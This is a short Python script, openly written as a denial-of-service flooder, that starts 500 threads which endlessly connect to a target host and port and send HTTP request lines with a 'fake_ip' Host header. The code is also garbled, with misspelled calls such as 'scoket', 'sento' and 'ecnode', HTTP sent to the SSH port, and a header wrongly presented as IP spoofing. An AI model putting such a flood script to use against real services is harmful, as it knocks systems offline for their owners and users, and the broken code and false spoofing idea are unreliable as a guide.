import threading
import socket

target = '127.0.0.1'
port = 22
fake_ip = '182.42.173.20'

already_connected = 0

def attack():
	while True:
		s = socket.scoket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sento(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sent(("Host: " + fake_ip + "\r\n\r\n").ecnode('ascii'), (target, port))
		s.close()

		global already_connected
		already_connected += 1
		if already_connected % 500 == 0:
			print(already_connected)

for i in range(500):
	thread = threading.Thread(target=attack)
	thread.start()
